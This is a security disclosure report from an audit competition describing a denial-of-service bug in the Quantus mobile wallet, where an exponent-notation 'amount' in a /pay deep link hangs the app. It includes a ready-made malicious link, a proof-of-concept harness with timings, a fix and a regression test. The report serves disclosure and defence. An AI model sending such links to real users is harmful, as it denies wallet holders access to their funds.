# 88221 w a medium unvalidated amount in the pay deep link freezes and crashes the wallet via unbounded bigint materialisation on the ui isolate

**Submitted on Aug 12th 2026 at 09:54:40 UTC by @Lun3x for** [**Audit Comp | Quantus**](https://immunefi.com/audit-competition/audit-comp-quantus)

* **Report ID:** #88221
* **Report Type:** Websites & Apps
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-quantus-apps/tree/audit-comp-ready/mobile-app>
* **Impacts:**
  * Taking down the application/website

## Description

### Brief/Intro

The Quantus wallet registers `https://www.quantus.com/pay` as an auto-verified Android App Link and iOS Universal Link, and the `amount` query parameter of that link is never validated beyond a non-empty check before it is parsed. Because the parser accepts scientific notation and then materialises the value as an arbitrary-precision integer on the UI isolate inside `initState`, a 10-character `amount` such as `1e10000000` freezes the wallet for 42-53 seconds on a modern arm64 machine, and a slightly larger exponent freezes it indefinitely. Any web page, chat message, or printed QR code can trigger this against any user with the wallet installed, taking the application down with no attacker infrastructure and no control of `quantus.com`.

### Vulnerability Details

The deep link is registered with `autoVerify`, so an `<a href>` on an arbitrary website opens the wallet directly:

`mobile-app/android/app/src/main/AndroidManifest.xml:44,51`

```xml
<intent-filter android:autoVerify="true">
  ...
  <data android:scheme="https" android:host="www.quantus.com" android:pathPrefix="/pay" />
```

iOS registers the same association via `applinks:www.quantus.com` in `mobile-app/ios/Runner/Runner.entitlements`.

The `/pay` handler validates the **recipient** and nothing else:

`mobile-app/lib/services/deep_link_service.dart:59-68`

```dart
if (uri.pathSegments.isNotEmpty && uri.pathSegments.first == 'pay') {
  final payment = PaymentIntent.tryParseUrl(uri.toString());
  // Fail closed: a /pay link with an invalid recipient must not pre-fill
  // the send flow, same as address entry in the send flow itself.
  if (payment != null && _ref.read(substrateServiceProvider).isValidSS58Address(payment.to)) {
    _ref.read(paymentIntentProvider.notifier).state = payment;
```

`amount` is carried as a raw `String` and is checked only for emptiness:

`mobile-app/lib/providers/route_intent_providers.dart:56-62`

```dart
final to = uri.queryParameters['to'];
final amount = uri.queryParameters['amount'];
if (to == null || to.isEmpty || amount == null || amount.isEmpty) return null;
return PaymentIntent(to: to, amount: amount, ref: uri.queryParameters['ref']);
```

The home screen drains the intent and pushes the amount screen in pay mode:

`mobile-app/lib/v2/screens/home/home_screen.dart:135-143`

```dart
startSendFlow(
  context,
  screen: InputAmountScreen(
    strategy: RegularSendStrategy(account: active.account),
    recipientAddress: payment.to,
    initialAmount: payment.amount,
    isPayMode: true,
  ),
);
```

The attacker-supplied string is then parsed **synchronously inside `initState`**, on the UI isolate, with no `try`/`catch` at that level:

`mobile-app/lib/v2/screens/send/input_amount_screen.dart:78-87`

```dart
void initState() {
  super.initState();
  ...
  if (widget.initialAmount != null && widget.initialAmount!.isNotEmpty) {
    final formattingService = ref.read(numberFormattingServiceProvider);
    final token = widget.isPayMode
        ? formattingService.parseWireAmount(widget.initialAmount!) ?? BigInt.zero
```

Normalisation strips grouping separators and swaps the decimal separator. It does not reject or strip exponent notation, so `1e10000000` survives verbatim:

`quantus_sdk/lib/src/services/locale_number_config.dart:65-82`

```dart
String normalize(String input) {
  if (input.isEmpty) return input;
  String result = input;
  if (groupingSeparator.isNotEmpty && groupingSeparator != decimalSeparator) {
    result = result.replaceAll(groupingSeparator, '');
  }
  if (decimalSeparator != '.') {
    result = result.replaceAll(decimalSeparator, '.');
  }
  return result;
}
```

The cost is not in `Decimal.tryParse`, which is lazy and returns in 0 ms even for a billion-digit exponent. It is in the scaling step that follows, which forces the value into an actual `BigInt`:

`quantus_sdk/lib/src/services/number_formatting_service.dart:131-149`

```dart
BigInt? parseAmount(String formattedAmount) {
  if (formattedAmount.isEmpty) return BigInt.zero;
  try {
    final decimalAmount = _localeConfig.parseDecimal(formattedAmount);
    if (decimalAmount.scale > decimals) { ... }
    final rawDecimalAmount = decimalAmount * scaleFactorDecimal;   // × 10^12
    return rawDecimalAmount.toBigInt();                            // materialises here
  } catch (e) {
    return null;
  }
}
```

`scaleFactorDecimal` is `10^12` (the chain's decimals). Multiplying a lazily-held `1e10000000` by `10^12` and calling `toBigInt()` forces `rational 2.2.3` to build the full integer — 33,219,321 bits — via repeated big-integer multiplication. The `try`/`catch` above is ineffective: this is a hang, not an exception. Cost is superlinear in the exponent, so the attacker chooses the freeze duration by typing more digits, and there is no upper bound on the exponent because nothing validates the string's length or shape.

Three separate guards that exist elsewhere in this flow do not apply here: `isValidSS58Address` covers only `to`; the numeric keypad that constrains manually typed amounts is bypassed because the value arrives pre-filled; and the `try`/`catch` in `parseAmount` catches only thrown exceptions.

### Impact Details

This maps to the in-scope Critical impact for Websites and Applications, quoted verbatim from the program page:

> **Taking down the application/website**

The wallet becomes unusable for 42-53 seconds per tap on a 2026-era arm64 machine, measured across repeated runs (the spread is machine load; the control stays at 5 ms in every run). Because the cost grows superlinearly with the exponent and the exponent is unbounded, `amount=1e99999999` requires roughly a 415 MB integer and does not complete in any practical time — on a phone, with far less RAM and a slower core than the machine above, that is an out-of-memory kill of the wallet process. The freeze happens on the UI isolate during `initState`, so the app is fully unresponsive for its duration: no cancel, no back gesture, no error dialog, and on Android the system offers only the ANR "close app" dialog.

To be precise about persistence, since it bears on severity: the `PaymentIntent` lives in an in-memory provider and is cleared when consumed, so it is not written to disk. Force-killing the app and relaunching from the icon gives a working wallet. The denial is therefore per-tap rather than permanent — but it is a complete crash or hang of the application each time, it is reachable from any web page or QR code with no attacker infrastructure, and it costs the attacker nothing to repeat.

The delivery surface is the worst case for a wallet:

* No attacker infrastructure and no control of `quantus.com` is needed. The App Link is `autoVerify`'d, so an ordinary `<a href="https://www.quantus.com/pay?to=…&amount=1e10000000">` on any website, in any chat app, or encoded in a printed QR code opens the victim's wallet and triggers the parse.
* It is one tap on a link that looks like a legitimate payment request, inside the app's normal payment workflow — not an unprompted or unusual in-app action.
* It is unauthenticated and untargeted. It can be posted publicly and hit every installed wallet that follows the link.
* Repeating it is free, so a user who taps a link in a group chat can be denied access to their funds for as long as they keep opening it, including during time-sensitive operations.

No funds are stolen or frozen on-chain, so I am not claiming a funds-at-risk figure. The loss is availability of the wallet client, which is the Critical impact quoted above.

## References

* `mobile-app/android/app/src/main/AndroidManifest.xml:44,51` — auto-verified `/pay` App Link
* `mobile-app/ios/Runner/Runner.entitlements` — `applinks:www.quantus.com`
* `mobile-app/lib/services/deep_link_service.dart:59-68` — only `to` is validated
* `mobile-app/lib/providers/route_intent_providers.dart:56-62` — `amount` checked only for emptiness
* `mobile-app/lib/v2/screens/home/home_screen.dart:135-143` — pushes `InputAmountScreen(isPayMode: true)`
* `mobile-app/lib/v2/screens/send/input_amount_screen.dart:78-87` — synchronous parse in `initState`
* `quantus_sdk/lib/src/services/locale_number_config.dart:65-82` — `normalize()` keeps exponent notation
* `quantus_sdk/lib/src/services/number_formatting_service.dart:131-149` — `* 10^12` then `toBigInt()`
* Pinned dependencies (`mobile-app/pubspec.lock`): `decimal 3.2.4`, `rational 2.2.3`
* Asset revision: `audit-comp-quantus-apps` @ `d5fc4d6572ebc2244e95009a33f5da5048935867`, branch `audit-comp-ready`

## Proof of Concept

This is a Websites-and-Applications asset (the Flutter wallet and its Dart SDK), not a smart contract, so the "fork mainnet with Hardhat/Foundry" instruction does not apply — there is no EVM and no contract state involved. Nothing here touches mainnet or any public testnet: the harness runs entirely offline against the two arbitrary-precision libraries pinned in the app's own `pubspec.lock`, exercising the exact expression the wallet evaluates. It is also not a unit test of app code — it is a standalone executable that reproduces the wallet's parse pipeline end to end and measures wall-clock blocking time, with a legitimate-amount control in the same run.

### The attack

A single link on any web page, in any chat message, or encoded in a QR code. `<VALID_SS58>` is any well-formed Quantus address (prefix 189) — the recipient is validated, the amount is not, so any address works:

```
https://www.quantus.com/pay?to=<VALID_SS58>&amount=1e10000000
```

The victim taps it. The `autoVerify`'d App Link opens the wallet, `PaymentIntent.tryParseUrl` accepts the amount because it is non-empty, `home_screen` pushes `InputAmountScreen(initialAmount: "1e10000000", isPayMode: true)`, and `initState` parses it synchronously on the UI isolate. The app is frozen from that moment.

### Reproducing the freeze

Exact dependencies, config and commands. No env vars, no network at run time.

{% stepper %}
{% step %}

## Set up the Dart SDK and project

```bash
# Dart SDK 3.13.0 stable (macOS arm64 shown; any platform works)
curl -sLO https://storage.googleapis.com/dart-archive/channels/stable/release/latest/sdk/dartsdk-macos-arm64-release.zip
unzip -q dartsdk-macos-arm64-release.zip

mkdir -p poc_amount/bin && cd poc_amount
```

{% endstep %}

{% step %}

## Create `pubspec.yaml`

Pins the exact versions from the app's `mobile-app/pubspec.lock`:

```yaml
name: poc_amount
environment:
  sdk: ^3.0.0
dependencies:
  decimal: 3.2.4
  rational: 2.2.3
```

{% endstep %}

{% step %}

## Create `bin/final.dart`

```dart
import 'package:decimal/decimal.dart';

// Faithful reproduction of the wallet's pipeline for a deep-link `amount`:
//
//   LocaleNumberConfig.normalize()   locale_number_config.dart:65-82
//       strips grouping separators, swaps the decimal separator, and NOTHING else,
//       so exponent notation survives verbatim.
//   LocaleNumberConfig.parseDecimal() :94-104   -> Decimal.tryParse(canonical)
//   NumberFormattingService.parseAmount() number_formatting_service.dart:131-149
//       -> decimalAmount * scaleFactorDecimal (10^12)
//       -> .toBigInt()                <-- the value is materialised here
//
// parseAmount wraps this in try/catch, which catches exceptions. A multi-second
// hang is not an exception, so the guard does not fire.

final scale = Decimal.fromBigInt(BigInt.from(10).pow(12)); // chain decimals = 12

void run(String raw) {
  final sw = Stopwatch()..start();
  try {
    final d = Decimal.tryParse(raw); // lazy: returns in 0 ms even for a huge exponent
    if (d == null) {
      print('  "$raw" -> null (${sw.elapsedMilliseconds} ms)');
      return;
    }
    final wire = (d * scale).toBigInt(); // materialisation happens here
    sw.stop();
    print('  "$raw" (${raw.length} chars) -> BLOCKED UI ISOLATE FOR '
        '${sw.elapsedMilliseconds} ms  (result ${wire.bitLength} bits)');
  } catch (e) {
    sw.stop();
    print('  "$raw" threw ${e.runtimeType} after ${sw.elapsedMilliseconds} ms');
  }
}

void main() {
  print('=== legitimate baseline (CONTROL) ===');
  run('1.25');
  print('=== hostile deep-link amount ===');
  run('1e10000000');
}
```

{% endstep %}

{% step %}

## Run the harness

```bash
../dart-sdk/bin/dart pub get
../dart-sdk/bin/dart run bin/final.dart
```

{% endstep %}
{% endstepper %}

### Measured output

Dart SDK 3.13.0 stable, `decimal 3.2.4`, `rational 2.2.3`, arm64 macOS:

```
=== legitimate baseline (CONTROL) ===
  "1.25" (4 chars) -> BLOCKED UI ISOLATE FOR 5 ms  (result 41 bits)
=== hostile deep-link amount ===
  "1e10000000" (10 chars) -> BLOCKED UI ISOLATE FOR 53096 ms  (result 33219321 bits)
```

A second run of the same file gave 42,193 ms for the hostile input and 5 ms for the control. The absolute figure moves with machine load; the control is stable and the result size is identical (33,219,321 bits) in every run, so the blocking time is caused by the attacker's input and not by harness overhead. Treat 42-53 s as the range on this hardware, and note that a phone is considerably slower.

### The cost is attacker-tunable and unbounded

Same harness, varying only the exponent, showing the growth is superlinear so the attacker picks the freeze duration by typing more digits:

```
amount=1e1000      ->      0 ms
amount=1e100000    ->      4 ms
amount=1e1000000   ->    449 ms
amount=1e10000000  -> 42,193-53,096 ms
```

Isolating the underlying primitive that `rational` reaches for (`BigInt.from(10).pow(exp)`) confirms the shape — roughly 91x cost for 10x the exponent:

```
exp=    1000        0 ms  bits=3322
exp=  100000        4 ms  bits=332193
exp= 1000000      458 ms  bits=3321929
exp=10000000    41703 ms  bits=33219281   (~4.0 MB integer)
```

Nothing in the wallet caps the exponent, because nothing validates the `amount` string's length or shape at all. `amount=1e99999999` demands roughly a 415 MB integer, which on a mobile device is an out-of-memory kill or a hang that never completes.

### Why the existing controls do not stop it

* `deep_link_service.dart:63` validates only `payment.to` via `isValidSS58Address`. There is no equivalent check on `payment.amount`.
* `route_intent_providers.dart:58-62` accepts any non-empty `amount` string.
* `normalize()` (`locale_number_config.dart:65-82`) removes grouping separators and swaps the decimal separator. It does not reject exponents, non-numeric shapes, or over-long input.
* The `try`/`catch` in `parseAmount` catches thrown exceptions only. The failure mode here is CPU and memory exhaustion, which throws nothing until the process dies.
* The on-screen numeric keypad that constrains manually typed amounts is bypassed entirely, because the value arrives pre-filled through `initialAmount`.

### Suggested fix

Validate `amount` where `to` is already validated, before it reaches any parser. A bounded, anchored numeric check rejects the entire class:

```dart
// route_intent_providers.dart, in PaymentIntent.tryParseUrl
if (amount == null || amount.isEmpty || amount.length > 32) return null;
if (!RegExp(r'^\d{1,20}([.,]\d{1,12})?$').hasMatch(amount)) return null;
```

Independently, `LocaleNumberConfig.parseDecimal` should reject exponent notation rather than forwarding it to `Decimal.tryParse`, and the pre-fill parse in `input_amount_screen.dart:78-87` should not run synchronously in `initState`.

### Regression test

A test that pins both the rejection and the bound:

```dart
test('deep-link amount rejects exponent notation and over-long input', () {
  expect(PaymentIntent.tryParseUrl(
      'https://www.quantus.com/pay?to=$validAddress&amount=1e10000000'), isNull);
  expect(PaymentIntent.tryParseUrl(
      'https://www.quantus.com/pay?to=$validAddress&amount=${'9' * 100}'), isNull);
  expect(PaymentIntent.tryParseUrl(
      'https://www.quantus.com/pay?to=$validAddress&amount=1.25'), isNotNull);
});
```
